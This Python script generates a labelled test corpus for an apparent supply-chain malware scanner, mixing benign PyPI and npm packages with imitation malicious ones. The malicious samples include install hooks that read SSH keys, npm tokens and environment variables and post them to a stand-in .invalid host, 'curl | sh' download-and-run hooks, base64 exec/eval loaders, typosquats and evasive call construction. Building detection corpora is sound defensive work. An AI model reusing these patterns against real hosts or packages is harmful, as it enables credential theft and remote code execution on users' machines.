"""Generate the SupplyShield test corpus.

SAFETY: every "malicious" sample is an INERT imitation of a real attack pattern.
 - All network destinations use the reserved .invalid domain (RFC 2606), which can never resolve.
 - Hidden payloads only print a message.
 - Nothing here is real malware, and nothing is downloaded.
SupplyShield and the comparison tools analyse these files statically. Never install them.

Run:  python samples/make_samples.py
"""
from __future__ import annotations

import base64
import json
import shutil
from pathlib import Path

HERE = Path(__file__).parent
C2 = "https://collector.example.invalid"
PAYLOAD = base64.b64encode(b'print("SupplyShield test payload: hidden code would run here")').decode()

PYPROJECT = """[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "{name}"
version = "{version}"
"""

SAMPLES: dict[str, dict[str, str]] = {}
LABELS: dict[str, dict] = {}


def add(path: str, files: dict[str, str], malicious: bool, ecosystem: str, note: str) -> None:
    SAMPLES[path] = files
    LABELS[path] = {"ecosystem": ecosystem, "malicious": malicious, "note": note}


def pkg_json(name, version, scripts=None, deps=None) -> str:
    d = {"name": name, "version": version, "main": "index.js"}
    if scripts:
        d["scripts"] = scripts
    if deps:
        d["dependencies"] = deps
    return json.dumps(d, indent=2) + "\n"


# ----------------------------------------------------------------- PyPI, benign
add("pypi/clean-tidytext", {
    "pyproject.toml": PYPROJECT.format(name="tidytext", version="1.2.0"),
    "tidytext/__init__.py": 'def slug(s: str) -> str:\n    return "-".join(s.lower().split())\n\n\n'
                            'def word_count(s: str) -> int:\n    return len(s.split())\n',
}, False, "pypi", "Plain text utility library")

add("pypi/clean-weatherlite", {
    "pyproject.toml": PYPROJECT.format(name="weatherlite", version="0.4.1"),
    "weatherlite/__init__.py": 'import requests\n\nAPI = "https://api.weather.example.invalid/v1"\n\n\n'
                               'def forecast(city: str) -> dict:\n'
                               '    return requests.get(f"{API}/forecast", params={"q": city}, timeout=10).json()\n',
}, False, "pypi", "Legitimate API client: network use is its job")

add("pypi/clean-gitversion", {
    "setup.py": 'import subprocess\nfrom setuptools import setup\n\n'
                'def version():\n'
                '    try:\n'
                '        return subprocess.check_output(["git", "describe", "--tags"], text=True).strip()\n'
                '    except Exception:\n'
                '        return "0.0.0"\n\n'
                'setup(name="gitversioned-tool", version="2.0.0", packages=["gvtool"])\n',
    "gvtool/__init__.py": "VERSION = '2.0.0'\n",
}, False, "pypi", "Common legitimate pattern: setup.py calls git for the version (expected false-positive risk)")

add("pypi/colorlib-1.0", {
    "pyproject.toml": PYPROJECT.format(name="colorlib", version="1.0.0"),
    "colorlib/__init__.py": 'def hex_to_rgb(h: str):\n    h = h.lstrip("#")\n'
                            '    return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))\n',
}, False, "pypi", "Clean first release of the update-pair package")

# ----------------------------------------------------------------- PyPI, malicious
add("pypi/mal-setup-exfil", {
    "setup.py": 'import os\nimport urllib.request\nfrom setuptools import setup\n'
                'from setuptools.command.install import install\n\n\n'
                'class PostInstall(install):\n'
                '    def run(self):\n'
                '        install.run(self)\n'
                '        key = open(os.path.expanduser("~/.ssh/id_rsa")).read()\n'
                f'        urllib.request.urlopen("{C2}/k", data=key.encode())\n\n\n'
                'setup(name="fastjsonify", version="0.1.0", packages=["fastjsonify"],\n'
                '      cmdclass={"install": PostInstall})\n',
    "fastjsonify/__init__.py": "import json\n\ndumps = json.dumps\n",
}, True, "pypi", "Install hook steals SSH private key (Backstabber-style install-time attack)")

add("pypi/mal-obfuscated", {
    "pyproject.toml": PYPROJECT.format(name="pretty-logs", version="0.3.0"),
    "pretty_logs/__init__.py": f'import base64\n\nexec(base64.b64decode("{PAYLOAD}"))\n\n\n'
                               'def info(msg):\n    print("[info]", msg)\n',
}, True, "pypi", "Base64-hidden payload executed on import")

add("pypi/mal-env-harvest", {
    "pyproject.toml": PYPROJECT.format(name="cloud-config-helper", version="1.0.2"),
    "cloud_config_helper/__init__.py": 'import json\nimport os\nimport urllib.request\n\n'
                                       'data = json.dumps(dict(os.environ)).encode()\n'
                                       f'urllib.request.urlopen("{C2}/env", data=data)\n',
}, True, "pypi", "Steals all environment variables (API keys, tokens) on import")

add("pypi/mal-typosquat-reqeusts", {
    "pyproject.toml": PYPROJECT.format(name="reqeusts", version="2.31.0"),
    "reqeusts/__init__.py": "# Typosquat of 'requests': re-exports the real library to avoid suspicion.\n"
                            "from requests import *  # noqa\n",
}, True, "pypi", "Typosquat of 'requests' with no visible payload")

add("pypi/colorlib-1.1", {
    "setup.py": 'import os\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\n\n'
                'class Telemetry(install):\n'
                '    def run(self):\n'
                '        install.run(self)\n'
                f'        os.system("curl -s {C2}/stage2.sh | sh")\n\n\n'
                'setup(name="colorlib", version="1.1.0", packages=["colorlib"],\n'
                '      cmdclass={"install": Telemetry})\n',
    "colorlib/__init__.py": 'def hex_to_rgb(h: str):\n    h = h.lstrip("#")\n'
                            '    return tuple(int(h[i:i + 2], 16) for i in (0, 2, 4))\n',
}, True, "pypi", "Poisoned update: 1.1 adds an install hook that downloads and runs a script")

add("pypi/mal-evasive", {
    "pyproject.toml": PYPROJECT.format(name="sysinfo-lite", version="0.2.0"),
    "sysinfo_lite/__init__.py": 'import importlib\n\n'
                                '# Module and function names are assembled at run time to evade pattern rules.\n'
                                'm = importlib.import_module(chr(111) + chr(115))\n'
                                'getattr(m, "sys" + "tem")("echo SupplyShield-test")\n',
}, True, "pypi", "Deliberately evasive: builds 'os.system' from pieces (expected miss)")

# ----------------------------------------------------------------- npm, benign
add("npm/clean-strtools", {
    "package.json": pkg_json("strtools-lite", "1.0.3"),
    "index.js": "exports.capitalize = s => s.charAt(0).toUpperCase() + s.slice(1);\n"
                "exports.reverse = s => [...s].reverse().join('');\n",
}, False, "npm", "Plain string utility library")

add("npm/clean-httpget", {
    "package.json": pkg_json("tiny-httpget", "0.5.0"),
    "index.js": "const https = require('https');\n\n"
                "module.exports = url => new Promise((resolve, reject) => {\n"
                "  https.get(url, res => { let b = ''; res.on('data', c => b += c); res.on('end', () => resolve(b)); })\n"
                "    .on('error', reject);\n});\n",
}, False, "npm", "Legitimate HTTP helper: network use is its job")

add("npm/clean-native-addon", {
    "package.json": pkg_json("fast-hashing", "3.1.0", scripts={"install": "node-gyp rebuild"}),
    "index.js": "module.exports = require('./build/Release/hash.node');\n",
}, False, "npm", "Native add-on with benign install script (common false-positive trigger)")

add("npm/minilog-1.0.0", {
    "package.json": pkg_json("minilog-pretty", "1.0.0"),
    "index.js": "module.exports = (...a) => console.log(new Date().toISOString(), ...a);\n",
}, False, "npm", "Clean first release of the update-pair package")

# ----------------------------------------------------------------- npm, malicious
add("npm/mal-postinstall-exfil", {
    "package.json": pkg_json("eslint-config-supreme", "1.0.0", scripts={"postinstall": "node setup.js"}),
    "index.js": "module.exports = { rules: {} };\n",
    "setup.js": "const fs = require('fs');\nconst os = require('os');\nconst https = require('https');\n\n"
                "const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
                "const body = JSON.stringify({ npmrc, env: process.env });\n"
                "const req = https.request('" + C2 + "/n', { method: 'POST' });\n"
                "req.end(body);\n",
}, True, "npm", "postinstall steals npm token and environment (most common npm malware pattern)")

add("npm/mal-obfuscated", {
    "package.json": pkg_json("color-console-x", "2.0.1"),
    "index.js": f"eval(Buffer.from('{base64.b64encode(b'console.log(\"SupplyShield test payload\")').decode()}', 'base64').toString());\n"
                "module.exports = s => console.log(s);\n",
}, True, "npm", "Base64-hidden payload executed with eval")

add("npm/mal-env-harvest", {
    "package.json": pkg_json("dotenv-loader-pro", "4.0.0"),
    "index.js": f"fetch('{C2}/e', {{ method: 'POST', body: JSON.stringify(process.env) }}).catch(() => {{}});\n"
                "module.exports = () => process.env;\n",
}, True, "npm", "Steals all environment variables on require()")

add("npm/mal-typosquat-lodahs", {
    "package.json": pkg_json("lodahs", "4.17.21"),
    "index.js": "// Typosquat of 'lodash': re-exports the real library.\nmodule.exports = require('lodash');\n",
}, True, "npm", "Typosquat of 'lodash' with no visible payload")

add("npm/minilog-1.0.1", {
    "package.json": pkg_json("minilog-pretty", "1.0.1",
                             scripts={"postinstall": f"curl -s {C2}/x.sh | sh"},
                             deps={"flatmap-streamz": "^0.1.1"}),
    "index.js": "module.exports = (...a) => console.log(new Date().toISOString(), ...a);\n",
}, True, "npm", "Poisoned update: adds install-time download-and-run plus a new dependency (event-stream style)")

add("npm/mal-evasive", {
    "package.json": pkg_json("perf-timer-utils", "0.9.0"),
    "index.js": "// Module and method names are assembled at run time to evade pattern rules.\n"
                "const cp = require(['child', 'process'].join('_'));\n"
                "cp['ex' + 'ec']('echo SupplyShield-test');\n"
                "module.exports = () => Date.now();\n",
}, True, "npm", "Deliberately evasive: builds require('child_process') from pieces (expected miss)")


def main() -> None:
    for sub in ("pypi", "npm"):
        shutil.rmtree(HERE / sub, ignore_errors=True)
    for rel, files in SAMPLES.items():
        for name, content in files.items():
            p = HERE / rel / name
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8", newline="\n")
    (HERE / "labels.json").write_text(json.dumps(LABELS, indent=2) + "\n", encoding="utf-8")
    print(f"wrote {len(SAMPLES)} samples")


if __name__ == "__main__":
    main()
